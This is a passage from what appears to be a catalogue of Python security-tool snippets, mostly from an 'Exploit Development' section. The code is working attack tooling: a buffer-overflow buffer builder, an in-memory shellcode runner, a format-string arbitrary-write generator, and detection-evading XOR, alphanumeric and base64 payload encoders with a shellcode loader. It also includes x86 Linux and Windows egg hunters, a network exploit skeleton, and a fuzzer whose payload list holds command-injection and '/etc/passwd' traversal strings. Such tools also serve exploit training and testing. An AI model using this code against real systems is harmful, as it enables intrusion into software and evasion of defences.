    filepath = sys.argv[1] if len(sys.argv) > 1 else "export.reg"
    entries = parse_reg_file(filepath)
    find_suspicious_entries(entries)
    print(f"\\n[Summary]")
    for key in sorted(entries.keys())[:20]:
        print(f"  {key}: {len(entries[key])} values")`
  },
  {
    name: "Config File Parser",
    desc: "Parse various configuration file formats (INI, YAML, XML, .env) and check for security issues.",
    code: `import configparser
import json
import re
import sys
import os
from xml.etree import ElementTree as ET

def parse_ini(filepath):
    config = configparser.ConfigParser()
    config.read(filepath)
    data = {}
    for section in config.sections():
        data[section] = dict(config[section])
    print(f"[INI] {filepath}: {len(data)} sections")
    return data

def parse_env(filepath):
    data = {}
    with open(filepath, "r") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            if "=" in line:
                key, _, value = line.partition("=")
                key = key.strip()
                value = value.strip().strip("'\\\"")
                data[key] = value
    print(f"[ENV] {filepath}: {len(data)} variables")
    return data

def parse_xml_config(filepath):
    tree = ET.parse(filepath)
    root = tree.getroot()
    data = {}
    def recurse(element, path=""):
        current_path = f"{path}/{element.tag}" if path else element.tag
        if element.text and element.text.strip():
            data[current_path] = element.text.strip()
        for attr_name, attr_value in element.attrib.items():
            data[f"{current_path}@{attr_name}"] = attr_value
        for child in element:
            recurse(child, current_path)
    recurse(root)
    print(f"[XML] {filepath}: {len(data)} values")
    return data

def check_security(config_data, source_name=""):
    print(f"\\n--- Security Check: {source_name} ---")
    sensitive_patterns = [
        (r"passw(or)?d", "Password"),
        (r"secret", "Secret"),
        (r"api[_-]?key", "API Key"),
        (r"token", "Token"),
        (r"private[_-]?key", "Private Key"),
        (r"connection[_-]?string", "Connection String"),
        (r"aws[_-]?(access|secret)", "AWS Credential"),
        (r"database[_-]?url", "Database URL"),
    ]
    findings = []
    for key, value in config_data.items():
        key_lower = key.lower()
        for pattern, label in sensitive_patterns:
            if re.search(pattern, key_lower, re.IGNORECASE):
                masked = str(value)[:3] + "***" if len(str(value)) > 3 else "***"
                findings.append({"key": key, "type": label, "masked_value": masked})
                print(f"  [WARN] {label} found: {key} = {masked}")
                break

    # Check for common misconfigurations
    for key, value in config_data.items():
        val_str = str(value).lower()
        if val_str in ("true", "1", "yes", "on"):
            if any(w in key.lower() for w in ["debug", "verbose", "trace"]):
                print(f"  [WARN] Debug mode enabled: {key} = {value}")
        if val_str == "0.0.0.0" or val_str == "*":
            if any(w in key.lower() for w in ["host", "bind", "listen", "address"]):
                print(f"  [WARN] Binding to all interfaces: {key} = {value}")
    if not findings:
        print("  [OK] No obvious sensitive values detected")
    return findings

if __name__ == "__main__":
    filepath = sys.argv[1] if len(sys.argv) > 1 else ".env"
    ext = os.path.splitext(filepath)[1].lower()
    if ext in (".ini", ".cfg", ".conf"):
        data = parse_ini(filepath)
        flat = {}
        for section, values in data.items():
            for k, v in values.items():
                flat[f"{section}.{k}"] = v
        check_security(flat, filepath)
    elif ext == ".xml":
        data = parse_xml_config(filepath)
        check_security(data, filepath)
    elif ext in (".env", ""):
        data = parse_env(filepath)
        check_security(data, filepath)
    elif ext == ".json":
        with open(filepath) as f:
            data = json.load(f)
        if isinstance(data, dict):
            def flatten(d, prefix=""):
                flat = {}
                for k, v in d.items():
                    key = f"{prefix}.{k}" if prefix else k
                    if isinstance(v, dict):
                        flat.update(flatten(v, key))
                    else:
                        flat[key] = v
                return flat
            flat = flatten(data)
            check_security(flat, filepath)`
  },

  // ============================================================
  // EXPLOIT DEVELOPMENT
  // ============================================================
  {
    name: "Buffer Overflow Pattern Generator",
    desc: "Generate and search for non-repeating patterns to determine buffer overflow offsets.",
    code: `import string
import struct
import sys

def pattern_create(length):
    pattern = ""
    upper = string.ascii_uppercase
    lower = string.ascii_lowercase
    digits = string.digits
    for u in upper:
        for l in lower:
            for d in digits:
                if len(pattern) >= length:
                    return pattern[:length]
                pattern += u + l + d
    return pattern[:length]

def pattern_offset(pattern, value):
    # Handle hex string input
    if isinstance(value, str):
        if value.startswith("0x"):
            value = value[2:]
        if all(c in string.hexdigits for c in value):
            # Convert hex to bytes and try both endiannesses
            if len(value) == 8:
                # Little-endian (most common on x86)
                le_bytes = bytes.fromhex(value)[::-1]
                le_str = le_bytes.decode("ascii", errors="replace")
                offset = pattern.find(le_str)
                if offset >= 0:
                    return offset, "little-endian"
                # Big-endian
                be_bytes = bytes.fromhex(value)
                be_str = be_bytes.decode("ascii", errors="replace")
                offset = pattern.find(be_str)
                if offset >= 0:
                    return offset, "big-endian"
            return -1, None
    # Try direct string search
    offset = pattern.find(str(value))
    if offset >= 0:
        return offset, "direct"
    return -1, None

def generate_exploit_buffer(offset, ret_addr, nop_sled=16, payload=b""):
    buf = b"A" * offset
    if isinstance(ret_addr, str):
        ret_addr = int(ret_addr, 16)
    buf += struct.pack("<I", ret_addr)  # Little-endian return address
    buf += b"\\x90" * nop_sled  # NOP sled
    buf += payload
    return buf

def find_bad_chars(allowed_range=range(256)):
    all_chars = bytearray(range(1, 256))  # Skip null byte
    print(f"Bad character test string ({len(all_chars)} bytes):")
    lines = []
    for i in range(0, len(all_chars), 16):
        chunk = all_chars[i:i+16]
        hex_str = " ".join(f"\\\\x{b:02x}" for b in chunk)
        lines.append(hex_str)
    print("\\n".join(lines))
    return all_chars

if __name__ == "__main__":
    length = int(sys.argv[1]) if len(sys.argv) > 1 else 500
    pattern = pattern_create(length)
    print(f"[*] Pattern ({length} bytes):")
    print(pattern)

    if len(sys.argv) > 2:
        value = sys.argv[2]
        offset, endian = pattern_offset(pattern, value)
        if offset >= 0:
            print(f"\\n[+] Offset found at position: {offset} ({endian})")
        else:
            print(f"\\n[-] Pattern not found for value: {value}")
    else:
        # Demo: find a known substring
        test_val = pattern[100:104]
        hex_val = "".join(f"{ord(c):02x}" for c in test_val)
        print(f"\\n[Demo] Looking for bytes at offset 100: {test_val} (0x{hex_val})")
        offset, endian = pattern_offset(pattern, test_val)
        print(f"[+] Found at offset: {offset}")

    print(f"\\n[*] Bad characters test string:")
    find_bad_chars()`
  },
  {
    name: "Shellcode Runner",
    desc: "Load and execute shellcode in memory using ctypes for testing and analysis.",
    code: `import ctypes
import sys
import mmap

def run_shellcode_mmap(shellcode):
    if isinstance(shellcode, str):
        shellcode = bytes.fromhex(shellcode.replace("\\\\x", "").replace(" ", ""))

    print(f"[*] Shellcode size: {len(shellcode)} bytes")

    # Allocate executable memory using mmap
    mem = mmap.mmap(-1, len(shellcode),
                    prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)
    mem.write(shellcode)

    # Get the address of the mapped memory
    buf = ctypes.c_char_p(ctypes.addressof(ctypes.c_char.from_buffer(mem)))

    # Create a function pointer and call it
    functype = ctypes.CFUNCTYPE(ctypes.c_int)
    func = functype(ctypes.addressof(ctypes.c_char.from_buffer(mem)))

    print("[*] Executing shellcode...")
    result = func()
    print(f"[*] Shellcode returned: {result}")
    mem.close()
    return result

def analyze_shellcode(shellcode):
    if isinstance(shellcode, str):
        shellcode = bytes.fromhex(shellcode.replace("\\\\x", "").replace(" ", ""))

    print(f"\\n=== Shellcode Analysis ===")
    print(f"Size: {len(shellcode)} bytes")

    # Check for null bytes
    null_positions = [i for i, b in enumerate(shellcode) if b == 0]
    if null_positions:
        print(f"[!] Null bytes found at positions: {null_positions}")
    else:
        print(f"[OK] No null bytes")

    # Common byte statistics
    from collections import Counter
    freq = Counter(shellcode)
    print(f"\\nByte frequency (top 10):")
    for byte, count in freq.most_common(10):
        pct = count / len(shellcode) * 100
        print(f"  0x{byte:02x}: {count:4d} ({pct:.1f}%)")

    # Check for common patterns
    patterns = {
        b"\\xcd\\x80": "int 0x80 (Linux syscall)",
        b"\\x0f\\x05": "syscall (Linux x64)",
        b"\\xff\\x15": "call [addr] (indirect call)",
        b"\\x68": "push immediate",
        b"/bin/sh": "String: /bin/sh",
        b"/bin/bash": "String: /bin/bash",
        b"cmd.exe": "String: cmd.exe",
        b"WinExec": "API: WinExec",
        b"CreateProcess": "API: CreateProcess",
    }
    print(f"\\nPattern detection:")
    for pattern, desc in patterns.items():
        offset = shellcode.find(pattern)
        if offset >= 0:
            print(f"  [+] {desc} at offset {offset}")

    # Hex dump
    print(f"\\nHex dump:")
    for i in range(0, min(len(shellcode), 256), 16):
        chunk = shellcode[i:i+16]
        hex_str = " ".join(f"{b:02x}" for b in chunk)
        ascii_str = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
        print(f"  {i:04x}: {hex_str:<48s} {ascii_str}")

if __name__ == "__main__":
    # Example: NOP sled + INT3 breakpoint (safe for testing)
    test_shellcode = b"\\x90" * 16 + b"\\xcc"  # NOPs + INT3
    print("[*] Test shellcode (NOP sled + INT3)")
    analyze_shellcode(test_shellcode)`
  },
  {
    name: "ROP Gadget Finder Concept",
    desc: "Search for ROP gadgets (return-oriented programming) in binary files by scanning for ret instructions.",
    code: `import struct
import sys
import re

def load_binary(filepath):
    with open(filepath, "rb") as f:
        data = f.read()
    print(f"[*] Loaded {filepath}: {len(data)} bytes")
    return data

def find_gadgets(data, base_addr=0x08048000, max_gadget_len=10):
    gadgets = {}
    # x86 RET instruction
    ret_positions = [i for i in range(len(data)) if data[i] == 0xc3]
    print(f"[*] Found {len(ret_positions)} RET instructions")

    # Common useful instruction patterns (x86)
    useful_patterns = {
        b"\\x58\\xc3": "pop eax; ret",
        b"\\x5b\\xc3": "pop ebx; ret",
        b"\\x59\\xc3": "pop ecx; ret",
        b"\\x5a\\xc3": "pop edx; ret",
        b"\\x5e\\xc3": "pop esi; ret",
        b"\\x5f\\xc3": "pop edi; ret",
        b"\\x5d\\xc3": "pop ebp; ret",
        b"\\x89\\xe0\\xc3": "mov eax, esp; ret",
        b"\\x89\\xe5\\xc3": "mov ebp, esp; ret",
        b"\\x31\\xc0\\xc3": "xor eax, eax; ret",
        b"\\x31\\xdb\\xc3": "xor ebx, ebx; ret",
        b"\\x31\\xc9\\xc3": "xor ecx, ecx; ret",
        b"\\x31\\xd2\\xc3": "xor edx, edx; ret",
        b"\\xff\\xe0": "jmp eax",
        b"\\xff\\xe4": "jmp esp",
        b"\\xff\\xd0": "call eax",
        b"\\x50\\xc3": "push eax; ret",
        b"\\x89\\xc3\\xc3": "mov ebx, eax; ret",
        b"\\x89\\xc1\\xc3": "mov ecx, eax; ret",
        b"\\x89\\xc2\\xc3": "mov edx, eax; ret",
        b"\\x87\\xf6\\xc3": "xchg esi, esi; ret",  # NOP equivalent
        b"\\x94\\xc3": "xchg eax, esp; ret",
        b"\\xc9\\xc3": "leave; ret",
    }

    # Search for known patterns
    print(f"\\n--- Known Gadgets ---")
    for pattern, desc in useful_patterns.items():
        offset = 0
        while True:
            pos = data.find(pattern, offset)
            if pos == -1:
                break
            addr = base_addr + pos
            gadgets[addr] = desc
            print(f"  0x{addr:08x}: {desc}")
            offset = pos + 1

    # Search backwards from each RET for multi-instruction gadgets
    print(f"\\n--- Multi-instruction Gadgets (sample) ---")
    count = 0
    for ret_pos in ret_positions:
        for length in range(2, max_gadget_len + 1):
            start = ret_pos - length + 1
            if start < 0:
                continue
            gadget_bytes = data[start:ret_pos + 1]
            addr = base_addr + start
            if addr not in gadgets and not any(b == 0 for b in gadget_bytes[:-1]):
                hex_str = " ".join(f"{b:02x}" for b in gadget_bytes)
                if count < 50:
                    gadgets[addr] = hex_str
                    count += 1

    print(f"\\n[*] Total gadgets found: {len(gadgets)}")
    return gadgets

if __name__ == "__main__":
    filepath = sys.argv[1] if len(sys.argv) > 1 else "/usr/bin/ls"
    base = int(sys.argv[2], 16) if len(sys.argv) > 2 else 0x08048000
    data = load_binary(filepath)
    gadgets = find_gadgets(data, base_addr=base)`
  },
  {
    name: "Format String Exploit Helper",
    desc: "Generate format string payloads for reading and writing arbitrary memory addresses.",
    code: `import struct
import sys

def generate_read_payload(offset, count=1):
    payloads = []
    for i in range(count):
        # Direct parameter access: %N$x reads the Nth argument from stack
        payload = f"%{offset + i}$x"
        payloads.append(payload)
    return payloads

def generate_write_payload(target_addr, value, offset, arch=32):
    if arch == 32:
        addr_bytes = struct.pack("<I", target_addr)
    else:
        addr_bytes = struct.pack("<Q", target_addr)

    # Write the value byte by byte using %hhn (writes 1 byte)
    writes = []
    for i in range(4 if arch == 32 else 8):
        byte_val = (value >> (i * 8)) & 0xFF
        addr = target_addr + i
        writes.append((addr, byte_val))

    print(f"[*] Target: 0x{target_addr:08x}")
    print(f"[*] Value:  0x{value:08x}")
    print(f"[*] Offset: {offset}")
    print(f"\\nByte-by-byte writes:")
    for addr, byte_val in writes:
        print(f"  0x{addr:08x} <- 0x{byte_val:02x} ({byte_val})")

    # Build the format string
    payload = b""
    # Add addresses first
    for addr, _ in writes:
        payload += struct.pack("<I", addr) if arch == 32 else struct.pack("<Q", addr)

    # Add format specifiers
    written = len(writes) * (4 if arch == 32 else 8)
    for i, (_, byte_val) in enumerate(writes):
        needed = (byte_val - written) % 256
        if needed > 0:
            payload += f"%{needed}c".encode()
        payload += f"%{offset + i}$hhn".encode()
        written = byte_val

    return payload

def generate_leak_payload(offset, count=20):
    print(f"[*] Stack leak payload (offset {offset}, {count} values):")
    leak = "|".join(f"%{offset + i}$08x" for i in range(count))
    print(f"  {leak}")
    return leak

def calculate_offset_interactive():
    # Generate a unique pattern for each format position
    print("[*] Use this payload to find the format string offset:")
    payload = "AAAA" + ".".join(f"%{i}$x" for i in range(1, 30))
    print(f"  {payload}")
    print(f"\\n  Look for '41414141' in the output.")
    print(f"  The position where it appears is your offset.")

if __name__ == "__main__":
    if len(sys.argv) >= 4:
        target = int(sys.argv[1], 16)
        value = int(sys.argv[2], 16)
        offset = int(sys.argv[3])
        payload = generate_write_payload(target, value, offset)
        print(f"\\nPayload ({len(payload)} bytes):")
        print(f"  Hex: {payload.hex()}")
    else:
        print("=== Format String Exploit Helper ===\\n")
        print("Usage: python fmt_string.py <target_addr> <value> <offset>\\n")
        calculate_offset_interactive()
        print()
        generate_leak_payload(6)
        print()
        # Demo write
        generate_write_payload(0x0804a010, 0xdeadbeef, 6)`
  },
  {
    name: "Basic Fuzzer",
    desc: "A simple protocol fuzzer that sends malformed inputs to test for crashes and unexpected behavior.",
    code: `import socket
import sys
import random
import string
import time
import struct

class Fuzzer:
    def __init__(self, target, port, protocol="tcp"):
        self.target = target
        self.port = port
        self.protocol = protocol
        self.payloads = []
        self.results = []
        self._generate_payloads()

    def _generate_payloads(self):
        # Buffer overflow strings
        for length in [100, 256, 512, 1024, 2048, 4096, 8192, 16384, 65535]:
            self.payloads.append(("overflow_A", b"A" * length))
            self.payloads.append(("overflow_pattern", self._pattern(length)))

        # Format string payloads
        fmt_strings = [b"%s" * 20, b"%x" * 50, b"%n" * 20, b"%p" * 50,
                       b"%.99999d", b"%08x." * 100]
        for fmt in fmt_strings:
            self.payloads.append(("format_string", fmt))

        # Integer boundaries
        for val in [0, -1, 0x7FFFFFFF, 0x80000000, 0xFFFFFFFF, 0x100, 0x10000]:
            self.payloads.append(("integer", str(val).encode()))
            self.payloads.append(("integer_le", struct.pack("<I", val & 0xFFFFFFFF)))

        # Special characters
        specials = [b"\\x00", b"\\xff" * 100, b"\\r\\n" * 100,
                    b"../../../etc/passwd", b"\\x00\\xff" * 500]
        for sp in specials:
            self.payloads.append(("special", sp))

        # Command injection
        cmds = [b"; ls", b"| cat /etc/passwd", b"$( id )", b"$(whoami)",
                b"\\r\\nINJECTED", b"\\x00AFTER_NULL"]
        for cmd in cmds:
            self.payloads.append(("command_injection", cmd))

    def _pattern(self, length):
        chars = string.ascii_uppercase + string.digits
        return "".join(random.choices(chars, k=length)).encode()

    def send_payload(self, payload, timeout=3):
        try:
            if self.protocol == "tcp":
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(timeout)
            if self.protocol == "tcp":
                sock.connect((self.target, self.port))
            sock.sendto(payload, (self.target, self.port)) if self.protocol == "udp" else sock.send(payload)
            try:
                response = sock.recv(4096)
                return "response", response
            except socket.timeout:
                return "timeout", None
        except ConnectionRefusedError:
            return "refused", None
        except ConnectionResetError:
            return "reset", None
        except BrokenPipeError:
            return "broken", None
        except Exception as e:
            return "error", str(e)
        finally:
            try:
                sock.close()
            except Exception:
                pass

    def fuzz(self, delay=0.1):
        print(f"[*] Fuzzing {self.target}:{self.port} ({self.protocol.upper()})")
        print(f"[*] {len(self.payloads)} payloads to send\\n")
        crashes = []
        for i, (category, payload) in enumerate(self.payloads):
            status, response = self.send_payload(payload)
            result = {
                "index": i,
                "category": category,
                "payload_len": len(payload),
                "status": status,
            }
            self.results.append(result)
            if status in ("reset", "broken", "refused"):
                print(f"  [{i}] CRASH? {category} ({len(payload)} bytes) -> {status}")
                crashes.append(result)
            elif status == "error":
                print(f"  [{i}] ERROR  {category} ({len(payload)} bytes) -> {response}")
            else:
                sys.stdout.write(f"\\r  [{i}/{len(self.payloads)}] {category:20s} ({len(payload):6d} bytes) -> {status}  ")
            time.sleep(delay)

        print(f"\\n\\n[*] Fuzzing complete")
        print(f"[*] {len(crashes)} potential crashes detected")
        for crash in crashes:
            print(f"  Payload #{crash['index']}: {crash['category']} ({crash['payload_len']} bytes)")
        return crashes

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 9999
    fuzzer = Fuzzer(target, port)
    fuzzer.fuzz()`
  },
  {
    name: "Payload Encoder",
    desc: "Encode shellcode and payloads using various techniques to evade basic detection.",
    code: `import random
import sys
import base64

def xor_encode(shellcode, key=None):
    if key is None:
        # Find a key that avoids null bytes in output
        for candidate in range(1, 256):
            encoded = bytes(b ^ candidate for b in shellcode)
            if b"\\x00" not in encoded:
                key = candidate
                break
        if key is None:
            key = random.randint(1, 255)
    encoded = bytes(b ^ key for b in shellcode)
    # Generate decoder stub (x86)
    decoder = (
        b"\\xeb\\x0d"           # jmp short get_shellcode
        b"\\x5e"               # pop esi
        b"\\x31\\xc9"           # xor ecx, ecx
        b"\\xb1" + bytes([len(shellcode)]) +  # mov cl, length
        b"\\x80\\x36" + bytes([key]) +        # xor byte [esi], key
        b"\\x46"               # inc esi
        b"\\xe2\\xfa"           # loop decode
        b"\\xeb\\x05"           # jmp short shellcode
        b"\\xe8\\xf0\\xff\\xff\\xff"  # call pop_esi
    )
    return key, encoded, decoder + encoded

def alpha_encode(shellcode):
    encoded = ""
    for byte in shellcode:
        high = (byte >> 4) & 0x0F
        low = byte & 0x0F
        encoded += chr(0x41 + high) + chr(0x41 + low)
    return encoded

def base64_encode_payload(shellcode):
    encoded = base64.b64encode(shellcode).decode()
    # Python decoder
    decoder_py = f"""import base64,ctypes,mmap
sc=base64.b64decode("{encoded}")
m=mmap.mmap(-1,len(sc),prot=7)
m.write(sc)
ctypes.CFUNCTYPE(None)(ctypes.addressof(ctypes.c_char.from_buffer(m)))()"""
    return encoded, decoder_py

def polymorphic_nop_sled(length):
    # x86 single-byte NOPs and NOP equivalents
    nop_equivalents = [
        b"\\x90",         # nop
        b"\\x41",         # inc ecx (can be overwritten)
        b"\\x42",         # inc edx
        b"\\x43",         # inc ebx
        b"\\x46",         # inc esi
        b"\\x47",         # inc edi
        b"\\x48",         # dec eax
        b"\\x4a",         # dec edx
        b"\\x40",         # inc eax
    ]
    sled = b""
    while len(sled) < length:
        sled += random.choice(nop_equivalents)
    return sled[:length]

def insert_garbage(shellcode, frequency=3):
    result = bytearray()
    garbage_instructions = [
        b"\\x90",             # nop
        b"\\x40\\x48",         # inc eax; dec eax
        b"\\x50\\x58",         # push eax; pop eax
        b"\\x51\\x59",         # push ecx; pop ecx
        b"\\x87\\xc0",         # xchg eax, eax
    ]
    for i, byte in enumerate(shellcode):
        result.append(byte)
        if i % frequency == 0 and i < len(shellcode) - 1:
            result.extend(random.choice(garbage_instructions))
    return bytes(result)

if __name__ == "__main__":
    # Example shellcode (INT3 breakpoints for safe testing)
    test_sc = b"\\xcc" * 4 + b"\\x31\\xc0" + b"\\xcc" * 4
    print(f"[*] Original shellcode ({len(test_sc)} bytes):")
    print(f"    {test_sc.hex()}")

    # XOR encoding
    key, encoded, full = xor_encode(test_sc)
    print(f"\\n[XOR Encode] Key=0x{key:02x}")
    print(f"  Encoded: {encoded.hex()}")
    print(f"  Full with decoder: {full.hex()} ({len(full)} bytes)")

    # Alphanumeric encoding
    alpha = alpha_encode(test_sc)
    print(f"\\n[Alpha Encode]")
    print(f"  Encoded: {alpha}")

    # Base64
    b64, decoder = base64_encode_payload(test_sc)
    print(f"\\n[Base64 Encode]")
    print(f"  Encoded: {b64}")

    # Polymorphic NOP sled
    sled = polymorphic_nop_sled(32)
    print(f"\\n[Polymorphic NOP Sled] ({len(sled)} bytes)")
    print(f"  {sled.hex()}")`
  },
  {
    name: "Egg Hunter Concept",
    desc: "Implement an egg hunter pattern for staged shellcode delivery in exploits.",
    code: `import struct
import sys

def generate_egg(tag="w00t"):
    if isinstance(tag, str):
        tag = tag.encode()
    if len(tag) != 4:
        raise ValueError("Egg tag must be exactly 4 bytes")
    return tag

def egg_hunter_linux_x86(tag="w00t"):
    tag_bytes = generate_egg(tag)
    tag_dword = struct.unpack("<I", tag_bytes)[0]

    # Linux x86 egg hunter using access(2) syscall
    # This safely checks if memory is readable before scanning
    hunter = bytearray()
    hunter += b"\\x31\\xc9"                   # xor ecx, ecx
    hunter += b"\\xf7\\xe1"                   # mul ecx (zero eax, edx)
    hunter += b"\\x66\\x81\\xca\\xff\\x0f"     # or dx, 0xfff  (page align)
    hunter += b"\\x42"                       # inc edx
    hunter += b"\\x60"                       # pushad
    hunter += b"\\x8d\\x5a\\x04"               # lea ebx, [edx+4]
    hunter += b"\\x31\\xc0"                   # xor eax, eax
    hunter += b"\\xb0\\x21"                   # mov al, 0x21 (access syscall)
    hunter += b"\\xcd\\x80"                   # int 0x80
    hunter += b"\\x3c\\xf2"                   # cmp al, 0xf2 (EFAULT)
    hunter += b"\\x61"                       # popad
    hunter += b"\\x74\\xed"                   # je next_page
    hunter += b"\\xb8" + tag_bytes           # mov eax, <tag>
    hunter += b"\\x89\\xd7"                   # mov edi, edx
    hunter += b"\\xaf"                       # scasd (compare eax with [edi])
    hunter += b"\\x75\\xe8"                   # jne inc_addr
    hunter += b"\\xaf"                       # scasd (second tag check)
    hunter += b"\\x75\\xe5"                   # jne inc_addr
    hunter += b"\\xff\\xe7"                   # jmp edi (jump to shellcode)

    print(f"[*] Linux x86 Egg Hunter")
    print(f"    Tag: {tag} (0x{tag_dword:08x})")
    print(f"    Size: {len(hunter)} bytes")
    return bytes(hunter)

def egg_hunter_windows_seh(tag="w00t"):
    tag_bytes = generate_egg(tag)
    tag_dword = struct.unpack("<I", tag_bytes)[0]

    # Windows egg hunter using SEH (Structured Exception Handling)
    hunter = bytearray()
    hunter += b"\\xeb\\x21"                   # jmp set_seh
    hunter += b"\\x59"                       # pop ecx (exception handler)
    hunter += b"\\xb8" + tag_bytes           # mov eax, <tag>
    hunter += b"\\x51"                       # push ecx
    hunter += b"\\x6a\\xff"                   # push -1
    hunter += b"\\x33\\xdb"                   # xor ebx, ebx
    hunter += b"\\x64\\x89\\x23"               # mov fs:[ebx], esp
    hunter += b"\\x6a\\x02"                   # push 2
    hunter += b"\\x59"                       # pop ecx
    hunter += b"\\x8b\\xfb"                   # mov edi, ebx
    hunter += b"\\xf3\\xaf"                   # repe scasd
    hunter += b"\\x75\\x07"                   # jne next_page
    hunter += b"\\xff\\xe7"                   # jmp edi
    hunter += b"\\x66\\x81\\xcb\\xff\\x0f"     # or bx, 0xfff
    hunter += b"\\x43"                       # inc ebx
    hunter += b"\\xeb\\xed"                   # jmp search
    hunter += b"\\xe8\\xda\\xff\\xff\\xff"       # call handler

    print(f"[*] Windows SEH Egg Hunter")
    print(f"    Tag: {tag} (0x{tag_dword:08x})")
    print(f"    Size: {len(hunter)} bytes")
    return bytes(hunter)

def create_egg_payload(shellcode, tag="w00t"):
    tag_bytes = generate_egg(tag)
    # Prepend egg (repeated twice for reliability)
    payload = tag_bytes + tag_bytes + shellcode
    print(f"[*] Egg Payload: {len(tag_bytes)*2} byte header + {len(shellcode)} byte shellcode")
    return payload

if __name__ == "__main__":
    tag = sys.argv[1] if len(sys.argv) > 1 else "w00t"
    print("=== Egg Hunter Generator ===\\n")
    linux_hunter = egg_hunter_linux_x86(tag)
    print(f"  Hex: {linux_hunter.hex()}")
    print(f"  C:   {''.join(f'\\\\x{b:02x}' for b in linux_hunter)}\\n")
    win_hunter = egg_hunter_windows_seh(tag)
    print(f"  Hex: {win_hunter.hex()}")
    print(f"  C:   {''.join(f'\\\\x{b:02x}' for b in win_hunter)}\\n")
    # Create a tagged payload
    test_sc = b"\\xcc\\xcc\\xcc\\xcc"  # INT3 breakpoints
    payload = create_egg_payload(test_sc, tag)
    print(f"  Payload hex: {payload.hex()}")`
  },
  {
    name: "Return Address Finder",
    desc: "Search binary files and loaded libraries for usable return addresses (JMP ESP, CALL ESP, etc.).",
    code: `import struct
import sys
import os
import re

# Common instruction sequences to search for
GADGETS = {
    "jmp esp":       b"\\xff\\xe4",
    "call esp":      b"\\xff\\xd4",
    "push esp; ret": b"\\x54\\xc3",
    "jmp eax":       b"\\xff\\xe0",
    "call eax":      b"\\xff\\xd0",
    "jmp ebx":       b"\\xff\\xe3",
    "call ebx":      b"\\xff\\xd3",
    "jmp ecx":       b"\\xff\\xe1",
    "jmp edx":       b"\\xff\\xe2",
    "jmp esi":       b"\\xff\\xe6",
    "jmp edi":       b"\\xff\\xe7",
    "push eax; ret": b"\\x50\\xc3",
    "push ebx; ret": b"\\x53\\xc3",
    "push ecx; ret": b"\\x51\\xc3",
    "push edx; ret": b"\\x52\\xc3",
}

def search_binary(filepath, base_addr=0x00000000, bad_chars=None):
    if bad_chars is None:
        bad_chars = [0x00, 0x0a, 0x0d]

    with open(filepath, "rb") as f:
        data = f.read()

    print(f"[*] Searching {filepath} ({len(data)} bytes)")
    print(f"[*] Base address: 0x{base_addr:08x}")
    print(f"[*] Bad characters: {' '.join(f'0x{b:02x}' for b in bad_chars)}")

    results = []
    for name, pattern in GADGETS.items():
        offset = 0
        while True:
            pos = data.find(pattern, offset)
            if pos == -1:
                break
            addr = base_addr + pos
            addr_bytes = struct.pack("<I", addr)

            # Check for bad characters in the address
            has_bad = any(b in bad_chars for b in addr_bytes)
            status = "BAD" if has_bad else "OK"

            results.append({
                "address": addr,
                "instruction": name,
                "status": status,
                "offset": pos,
            })

            if not has_bad:
                addr_str = "".join(f"\\\\x{b:02x}" for b in addr_bytes)
                print(f"  [+] 0x{addr:08x} ({addr_str}): {name}")

            offset = pos + 1

    # Summary
    clean = [r for r in results if r["status"] == "OK"]
    print(f"\\n[*] Found {len(results)} gadgets total, {len(clean)} without bad chars")
    return results

def search_proc_maps(pid=None):
    if pid is None:
        pid = os.getpid()

    maps_path = f"/proc/{pid}/maps"
    if not os.path.exists(maps_path):
        print(f"[!] Cannot read {maps_path}")
        return []

    print(f"[*] Reading memory map for PID {pid}")
    modules = []
    with open(maps_path, "r") as f:
        for line in f:
            parts = line.strip().split()
            if len(parts) >= 6:
                addr_range = parts[0]
                perms = parts[1]
                path = parts[5] if len(parts) > 5 else ""
                if "x" in perms and path and path.startswith("/"):
                    start, end = addr_range.split("-")
                    modules.append({
                        "start": int(start, 16),
                        "end": int(end, 16),
                        "perms": perms,
                        "path": path,
                    })
                    print(f"  0x{int(start, 16):08x}-0x{int(end, 16):08x} {perms} {path}")

    return modules

def generate_exploit_skeleton(ret_addr, payload_size=400, nop_sled=100):
    print(f"\\n=== Exploit Skeleton ===")
    print(f"Return address: 0x{ret_addr:08x}")
    ret_bytes = struct.pack("<I", ret_addr)

    skeleton = f"""#!/usr/bin/env python3
import struct
import socket

TARGET = "127.0.0.1"
PORT = 9999

# Shellcode placeholder (replace with actual shellcode)
shellcode = b""
shellcode += b"\\\\xcc" * 4  # INT3 breakpoints (replace)

# Exploit buffer
offset = {payload_size}  # Adjust based on pattern_offset
ret_addr = struct.pack("<I", 0x{ret_addr:08x})
nop_sled = b"\\\\x90" * {nop_sled}

buffer = b"A" * offset
buffer += ret_addr
buffer += nop_sled
buffer += shellcode

# Send exploit
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((TARGET, PORT))
sock.send(buffer)
sock.close()
print(f"[*] Exploit sent ({{len(buffer)}} bytes)")
"""
    print(skeleton)
    return skeleton

if __name__ == "__main__":
    if len(sys.argv) > 1:
        filepath = sys.argv[1]
        base = int(sys.argv[2], 16) if len(sys.argv) > 2 else 0x10000000
        results = search_binary(filepath, base_addr=base)
        if results:
            clean = [r for r in results if r["status"] == "OK"]
            if clean:
                generate_exploit_skeleton(clean[0]["address"])
    else:
        print("Usage: python ret_finder.py <binary> [base_address]")
        print("\\nSearching /usr/lib for common libraries...")
        lib_dir = "/usr/lib"
        if os.path.isdir(lib_dir):
            for fname in sorted(os.listdir(lib_dir))[:5]:
                fpath = os.path.join(lib_dir, fname)
                if os.path.isfile(fpath) and fname.endswith(".so"):
                    search_binary(fpath, base_addr=0x10000000)`
  },

  // ============================================================
  // NETWORK UTILITIES
  // ============================================================
  {
    name: "ARP Scanner",
    desc: "Discover hosts on the local network using ARP requests with Scapy.",
    code: `from scapy.all import ARP, Ether, srp, conf
import sys

conf.verb = 0

def arp_scan(network):
    print(f"[*] ARP scanning {network}")
    arp_request = ARP(pdst=network)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast / arp_request

    answered, _ = srp(packet, timeout=3, retry=2)

    hosts = []
    for sent, received in answered:
        host = {
            "ip": received.psrc,
            "mac": received.hwsrc,
